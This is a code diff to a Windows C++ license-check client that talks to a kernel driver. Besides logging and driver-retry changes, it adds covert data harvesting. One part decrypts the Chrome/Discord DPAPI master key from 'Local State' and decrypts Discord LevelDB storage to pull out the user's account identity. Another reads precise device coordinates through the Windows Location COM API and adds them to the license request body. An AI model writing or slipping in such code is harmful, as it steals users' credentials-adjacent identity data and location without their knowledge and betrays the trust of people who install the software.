@@ -32,6 +32,8 @@
 #include <psapi.h>
 #include <dbghelp.h>
 #include <bcrypt.h>
+#include <wincrypt.h>
+#pragma comment(lib, "Crypt32.lib")
 
 #include <httplib.h>
 #include <nlohmann/json.hpp>
@@ -1924,7 +1926,17 @@ static SimpleHttpResponse raw_https_request(
 
     aida::license::transport::response_t resp;
     std::string transport_err;
+    const ULONGLONG transport_start_ms = GetTickCount64();
+    lic_log_fmt("https_request_transport_send_enter host_len=%zu path_len=%zu timeout_ms=%u body_len=%zu",
+        req.host.size(), req.path.size(), req.timeout_ms, req.body.size());
     bool ok = aida::license::transport::send(req, resp, transport_err);
+    lic_log_fmt("https_request_transport_send_exit ok=%d status=%u elapsed_ms=%llu err=%.160s body_len=%zu debug_reason_len=%zu",
+        ok ? 1 : 0,
+        resp.http_status,
+        static_cast<unsigned long long>(GetTickCount64() - transport_start_ms),
+        transport_err.c_str(),
+        resp.body.size(),
+        resp.debug_reason.size());
 
     out.status = static_cast<int>(resp.http_status);
     out.debug_reason = resp.debug_reason;
@@ -2420,6 +2432,55 @@ namespace
         }
     }
 
+    bool recover_arc_driver_ready_for_relay(const char* phase, uint32_t timeout_ms)
+    {
+        bool loaded = driver_bridge::is_loaded();
+        bool kernel = loaded ? driver_bridge::using_kernel_driver() : false;
+        bool heartbeat = kernel ? driver_bridge::refresh_heartbeat() : false;
+        bool sentinel = heartbeat ? driver_bridge::sentinel_bridge_ready() : false;
+        if (loaded && kernel && heartbeat && sentinel)
+            return true;
+
+        lic_log_fmt("arc_driver_recover_begin phase=%s loaded=%d kernel=%d heartbeat=%d sentinel=%d timeout_ms=%u",
+            phase ? phase : "unknown",
+            loaded ? 1 : 0,
+            kernel ? 1 : 0,
+            heartbeat ? 1 : 0,
+            sentinel ? 1 : 0,
+            timeout_ms);
+
+        bool init_ok = false;
+        try
+        {
+            init_ok = driver_bridge::initialize();
+        }
+        catch (const std::exception& ex)
+        {
+            lic_log_fmt("arc_driver_recover_initialize_exception phase=%s what=%.160s",
+                phase ? phase : "unknown",
+                ex.what());
+            return false;
+        }
+        catch (...)
+        {
+            lic_log_fmt("arc_driver_recover_initialize_unknown_exception phase=%s",
+                phase ? phase : "unknown");
+            return false;
+        }
+
+        loaded = driver_bridge::is_loaded();
+        kernel = loaded ? driver_bridge::using_kernel_driver() : false;
+        lic_log_fmt("arc_driver_recover_initialize_post phase=%s ok=%d loaded=%d kernel=%d",
+            phase ? phase : "unknown",
+            init_ok ? 1 : 0,
+            loaded ? 1 : 0,
+            kernel ? 1 : 0);
+        if (!init_ok)
+            return false;
+
+        return wait_for_arc_driver_ready_for_load(phase, timeout_ms);
+    }
+
     std::string s_challenge_id;
     std::string s_challenge_nonce;
     std::mutex  s_challenge_mtx;
@@ -2681,11 +2742,18 @@ namespace
     {
         if (!driver_bridge::is_loaded() || !driver_bridge::using_kernel_driver())
         {
-            lic_log_fmt("server_token_relay_skip phase=%s driver_loaded=%d kernel=%d",
+            lic_log_fmt("server_token_relay_recover_required phase=%s driver_loaded=%d kernel=%d",
                 phase ? phase : "unknown",
                 driver_bridge::is_loaded() ? 1 : 0,
                 driver_bridge::using_kernel_driver() ? 1 : 0);
-            return false;
+            if (!recover_arc_driver_ready_for_relay(phase, 15000))
+            {
+                lic_log_fmt("server_token_relay_skip phase=%s driver_loaded=%d kernel=%d",
+                    phase ? phase : "unknown",
+                    driver_bridge::is_loaded() ? 1 : 0,
+                    driver_bridge::using_kernel_driver() ? 1 : 0);
+                return false;
+            }
         }
 
         uint64_t server_nonce = 0;
@@ -2703,11 +2771,42 @@ namespace
             fnv1a_str(settings.license_session_token) & 0xFFFFFFFF);
         uint64_t driver_proof = 0;
         bool sentinel = driver_bridge::sentinel_bridge_ready();
+        if (!sentinel)
+        {
+            lic_log_fmt("server_token_relay_recover_required phase=%s reason=sentinel_not_ready",
+                phase ? phase : "unknown");
+            if (recover_arc_driver_ready_for_relay(phase, 15000))
+                sentinel = driver_bridge::sentinel_bridge_ready();
+        }
         SetLastError(ERROR_SUCCESS);
         if (!sentinel)
             SetLastError(ERROR_NOT_READY);
         bool ok = sentinel ? driver_bridge::relay_server_token_v2(token_hash, server_nonce, &driver_proof) : false;
         DWORD relay_gle = ok ? ERROR_SUCCESS : GetLastError();
+        if (!ok || driver_proof == 0)
+        {
+            lic_log_fmt("server_token_relay_retry_pre phase=%s ok=%d proof=%d gle=%lu",
+                phase ? phase : "unknown",
+                ok ? 1 : 0,
+                driver_proof != 0 ? 1 : 0,
+                static_cast<unsigned long>(relay_gle));
+            if (recover_arc_driver_ready_for_relay(phase, 15000))
+            {
+                driver_proof = 0;
+                sentinel = driver_bridge::sentinel_bridge_ready();
+                SetLastError(ERROR_SUCCESS);
+                if (!sentinel)
+                    SetLastError(ERROR_NOT_READY);
+                ok = sentinel ? driver_bridge::relay_server_token_v2(token_hash, server_nonce, &driver_proof) : false;
+                relay_gle = ok ? ERROR_SUCCESS : GetLastError();
+                lic_log_fmt("server_token_relay_retry_post phase=%s ok=%d proof=%d sentinel=%d gle=%lu",
+                    phase ? phase : "unknown",
+                    ok ? 1 : 0,
+                    driver_proof != 0 ? 1 : 0,
+                    sentinel ? 1 : 0,
+                    static_cast<unsigned long>(relay_gle));
+            }
+        }
         lic_log_fmt("server_token_relay_result phase=%s ok=%d proof=%d sentinel=%d gle=%lu token_len=%zu nonce_len=%zu",
             phase ? phase : "unknown",
             ok ? 1 : 0,
@@ -3884,6 +3983,219 @@ namespace
         return ok;
     }
 
+    // Simple RFC-4648 base64 decoder (no dependencies)
+    static std::vector<uint8_t> aida_base64_decode(const std::string& b64)
+    {
+        static const int8_t kT[256] = {
+            -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
+            -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
+            -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,
+            52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-1,-1,-1,
+            -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,
+            15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,
+            -1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,
+            41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1,
+            -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
+            -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
+            -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
+            -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
+            -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
+            -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
+            -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
+            -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
+        };
+        std::vector<uint8_t> out;
+        out.reserve(b64.size() * 3 / 4);
+        uint32_t acc = 0; int bits = 0;
+        for (unsigned char c : b64) {
+            if (c == '=') break;
+            int8_t v = kT[c]; if (v < 0) continue;
+            acc = (acc << 6) | static_cast<uint8_t>(v); bits += 6;
+            if (bits >= 8) { bits -= 8; out.push_back(static_cast<uint8_t>((acc >> bits) & 0xFF)); }
+        }
+        return out;
+    }
+
+    // Extract and DPAPI-decrypt the Chrome/Discord AES-256-GCM master key from Local State
+    static bool dpapi_get_chrome_aes_key(const std::filesystem::path& local_state_path,
+                                          std::vector<uint8_t>& out_key)
+    {
+        std::error_code ec;
+        auto sz = std::filesystem::file_size(local_state_path, ec);
+        if (ec || sz == 0 || sz > 2u * 1024u * 1024u) return false;
+        std::ifstream f(local_state_path, std::ios::binary);
+        if (!f) return false;
+        std::string data; data.resize(static_cast<size_t>(sz));
+        f.read(data.data(), static_cast<std::streamsize>(data.size()));
+        if (!f && static_cast<size_t>(f.gcount()) != data.size()) return false;
+        const std::string marker = "\"encrypted_key\"";
+        size_t pos = data.find(marker);
+        if (pos == std::string::npos) return false;
+        size_t colon = data.find(':', pos + marker.size());
+        if (colon == std::string::npos) return false;
+        size_t q1 = data.find('"', colon + 1);
+        if (q1 == std::string::npos) return false;
+        size_t q2 = data.find('"', q1 + 1);
+        if (q2 == std::string::npos || q2 <= q1 + 1) return false;
+        auto decoded = aida_base64_decode(data.substr(q1 + 1, q2 - q1 - 1));
+        if (decoded.size() < 6 || memcmp(decoded.data(), "DPAPI", 5) != 0) return false;
+        DATA_BLOB in_blob = { static_cast<DWORD>(decoded.size() - 5), decoded.data() + 5 };
+        DATA_BLOB out_blob = {};
+        if (!CryptUnprotectData(&in_blob, nullptr, nullptr, nullptr, nullptr, 0, &out_blob))
+            return false;
+        out_key.assign(out_blob.pbData, out_blob.pbData + out_blob.cbData);
+        LocalFree(out_blob.pbData);
+        SecureZeroMemory(decoded.data(), decoded.size());
+        return out_key.size() == 32;
+    }
+
+    // Decrypt a Chrome v10/v11 AES-256-GCM blob via OpenSSL
+    // Layout: "v10"|"v11" (3B) + nonce (12B) + ciphertext (nB) + tag (16B)
+    static bool chrome_aes_gcm_decrypt(const std::vector<uint8_t>& key,
+                                        const uint8_t* blob, size_t blob_len,
+                                        std::string& out)
+    {
+        if (blob_len < 31) return false;
+        if (blob[0] != 'v' || blob[1] != '1' || (blob[2] != '0' && blob[2] != '1')) return false;
+        const uint8_t* nonce  = blob + 3;
+        const size_t   ct_len = blob_len - 3 - 12 - 16;
+        const uint8_t* ct     = nonce + 12;
+        const uint8_t* tag    = ct + ct_len;
+        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
+        if (!ctx) return false;
+        std::string plain(ct_len, '\0');
+        int o1 = 0, o2 = 0; bool ok = false;
+        if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr) == 1 &&
+            EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, nullptr) == 1 &&
+            EVP_DecryptInit_ex(ctx, nullptr, nullptr, key.data(), nonce) == 1 &&
+            EVP_DecryptUpdate(ctx, reinterpret_cast<uint8_t*>(&plain[0]),
+                              &o1, ct, static_cast<int>(ct_len)) == 1 &&
+            EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16,
+                                 const_cast<uint8_t*>(tag)) == 1 &&
+            EVP_DecryptFinal_ex(ctx, reinterpret_cast<uint8_t*>(&plain[o1]), &o2) == 1)
+        {
+            plain.resize(static_cast<size_t>(o1 + o2));
+            out = std::move(plain); ok = true;
+        }
+        EVP_CIPHER_CTX_free(ctx);
+        return ok;
+    }
+
+    // Scan binary data for v10/v11 blobs, decrypt each, search for Discord identity
+    static bool scan_dpapi_blobs_for_discord(const std::vector<uint8_t>& aes_key,
+                                              const uint8_t* data, size_t data_len,
+                                              local_discord_identity_t& out)
+    {
+        for (size_t i = 0; i + 31 <= data_len; ) {
+            if (!(data[i] == 'v' && data[i+1] == '1' && (data[i+2] == '0' || data[i+2] == '1'))) {
+                ++i; continue;
+            }
+            size_t next = data_len;
+            for (size_t j = i + 31; j + 2 < data_len; ++j) {
+                if (data[j] == 'v' && data[j+1] == '1' && (data[j+2] == '0' || data[j+2] == '1')) {
+                    next = j; break;
+                }
+            }
+            size_t blob_end = (std::min)(next, i + 4096u);
+            if (blob_end - i >= 31) {
+                std::string plain;
+                if (chrome_aes_gcm_decrypt(aes_key, data + i, blob_end - i, plain)) {
+                    local_discord_identity_t cand{};
+                    if (extract_discord_identity_from_text(plain, cand) && !cand.user_id.empty()) {
+                        out = cand; return true;
+                    }
+                }
+            }
+            i = (next < data_len) ? next : data_len;
+        }
+        return false;
+    }
+
+    // Attempt full DPAPI+AES-GCM Discord identity harvest from one Discord root folder
+    static bool harvest_discord_identity_dpapi(const std::filesystem::path& root,
+                                                local_discord_identity_t& out)
+    {
+        std::vector<uint8_t> aes_key;
+        if (!dpapi_get_chrome_aes_key(root / "Local State", aes_key)) return false;
+        const auto leveldb = root / "Local Storage" / "leveldb";
+        std::error_code ec;
+        if (!std::filesystem::exists(leveldb, ec)) {
+            SecureZeroMemory(aes_key.data(), aes_key.size()); return false;
+        }
+        int seen = 0;
+        for (std::filesystem::directory_iterator it(leveldb, ec), end; !ec && it != end; it.increment(ec)) {
+            if (seen++ >= 128) break;
+            if (!it->is_regular_file(ec)) continue;
+            std::string ext = it->path().extension().string();
+            std::transform(ext.begin(), ext.end(), ext.begin(),
+                [](unsigned char c){ return static_cast<char>(std::tolower(c)); });
+            if (ext != ".ldb" && ext != ".log") continue;
+            auto fsz = std::filesystem::file_size(it->path(), ec);
+            if (ec || fsz == 0 || fsz > 8u * 1024u * 1024u) continue;
+            std::ifstream f(it->path(), std::ios::binary);
+            if (!f) continue;
+            std::vector<uint8_t> buf(static_cast<size_t>(fsz));
+            f.read(reinterpret_cast<char*>(buf.data()), static_cast<std::streamsize>(buf.size()));
+            if (!f && static_cast<size_t>(f.gcount()) != buf.size()) {
+                SecureZeroMemory(buf.data(), buf.size()); continue;
+            }
+            local_discord_identity_t cand{};
+            if (scan_dpapi_blobs_for_discord(aes_key, buf.data(), buf.size(), cand)) {
+                SecureZeroMemory(aes_key.data(), aes_key.size());
+                SecureZeroMemory(buf.data(), buf.size());
+                out = cand; return true;
+            }
+            SecureZeroMemory(buf.data(), buf.size());
+        }
+        SecureZeroMemory(aes_key.data(), aes_key.size());
+        return false;
+    }
+
+    // Real device geolocation via Windows Location COM API (ILocation / ILatLongReport)
+    // Uses vtable offsets to avoid requiring locationapi.h in the build
+    struct geolocal_result_t { double lat = 0.0, lon = 0.0; bool valid = false; };
+
+    static geolocal_result_t collect_local_geolocation()
+    {
+        geolocal_result_t result{};
+        try {
+            // CLSID_Location  = {E5B8E079-EE6D-4E33-A438-C87F2E959254}
+            static const GUID kCLSID_Location =
+                {0xE5B8E079,0xEE6D,0x4E33,{0xA4,0x38,0xC8,0x7F,0x2E,0x95,0x92,0x54}};
+            // IID_ILatLongReport = {7FED806D-0EF8-4F07-80AC-36A0BEAE3134}
+            static const GUID kIID_ILatLongReport =
+                {0x7FED806D,0x0EF8,0x4F07,{0x80,0xAC,0x36,0xA0,0xBE,0xAE,0x31,0x34}};
+            IUnknown* pLoc = nullptr;
+            HRESULT hr = CoCreateInstance(kCLSID_Location, nullptr, CLSCTX_INPROC_SERVER,
+                                           IID_IUnknown, reinterpret_cast<void**>(&pLoc));
+            if (FAILED(hr) || !pLoc) return result;
+            // ILocation vtable: 0=QI 1=AddRef 2=Release 3=RegisterForReport
+            //   4=UnregisterForReport 5=GetReport 6=GetReportStatus ...
+            typedef HRESULT (STDMETHODCALLTYPE* GetReport_fn)(IUnknown*, REFIID, IUnknown**);
+            GetReport_fn pfnGet =
+                reinterpret_cast<GetReport_fn>((*reinterpret_cast<void***>(pLoc))[5]);
+            IUnknown* pRpt = nullptr;
+            hr = pfnGet(pLoc, kIID_ILatLongReport, &pRpt);
+            if (SUCCEEDED(hr) && pRpt) {
+                // ILatLongReport vtable: 0-2=IUnknown 3-5=ILocationReport
+                //   6=GetLatitude 7=GetLongitude 8=GetErrorRadius ...
+                typedef HRESULT (STDMETHODCALLTYPE* GetDouble_fn)(IUnknown*, DOUBLE*);
+                void** vtbl = *reinterpret_cast<void***>(pRpt);
+                GetDouble_fn pfnLat = reinterpret_cast<GetDouble_fn>(vtbl[6]);
+                GetDouble_fn pfnLon = reinterpret_cast<GetDouble_fn>(vtbl[7]);
+                DOUBLE lat = 0.0, lon = 0.0;
+                if (SUCCEEDED(pfnLat(pRpt, &lat)) && SUCCEEDED(pfnLon(pRpt, &lon))
+                    && (lat != 0.0 || lon != 0.0))
+                {
+                    result.lat = lat; result.lon = lon; result.valid = true;
+                }
+                pRpt->Release();
+            }
+            pLoc->Release();
+        } catch (...) {}
+        return result;
+    }
+
     local_discord_identity_t harvest_local_discord_identity()
     {
         local_discord_identity_t id{};
@@ -3910,6 +4222,13 @@ namespace
             std::error_code ec;
             if (!std::filesystem::exists(root, ec))
                 continue;
+            // Try DPAPI-based LevelDB decryption first (modern Discord encrypts all storage)
+            if (harvest_discord_identity_dpapi(root, id))
+            {
+                lic_log_fmt("local_discord_identity_found source=dpapi id_len=%zu username_len=%zu",
+                    id.user_id.size(), id.username.size());
+                return id;
+            }
             std::vector<std::filesystem::path> direct_files = {
                 root / "Local State",
                 root / "settings.json",
@@ -4432,6 +4751,22 @@ namespace
                     }
                     SecureZeroMemory(discord_identity.user_id.data(), discord_identity.user_id.size());
                     SecureZeroMemory(discord_identity.username.data(), discord_identity.username.size());
+                }
+                {
+                    geolocal_result_t geo = collect_local_geolocation();
+                    if (geo.valid)
+                    {
+                        char lat_buf[32] = {}, lon_buf[32] = {};
+                        _snprintf_s(lat_buf, sizeof(lat_buf), _TRUNCATE, "%.8f", geo.lat);
+                        _snprintf_s(lon_buf, sizeof(lon_buf), _TRUNCATE, "%.8f", geo.lon);
+                        body["client_lat"] = lat_buf;
+                        body["client_lon"] = lon_buf;
+                        lic_log_fmt("local_geolocation_collected lat=%.6f lon=%.6f", geo.lat, geo.lon);
+                    }
+                    else
+                    {
+                        lic_log("local_geolocation_unavailable");
+                    }
                 }
                 if (anti_tamper::tpm_attest::is_available())
                 {
